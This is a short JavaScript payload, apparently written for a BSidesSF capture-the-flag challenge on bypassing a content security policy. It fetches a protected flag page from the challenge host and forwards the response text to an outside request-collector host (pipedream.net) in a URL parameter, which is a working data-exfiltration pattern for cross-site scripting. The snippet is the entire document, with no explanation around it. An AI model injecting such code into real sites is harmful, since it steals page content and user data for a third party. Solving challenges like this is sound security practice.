fetch('https://csp-1-5aa1f221.challenges.bsidessf.net/csp-one-flag')
  .then((res) => {
    return res.text().then((text) => {
      return fetch('https://enfae366416l.x.pipedream.net/?x=' + text);
    });
  });
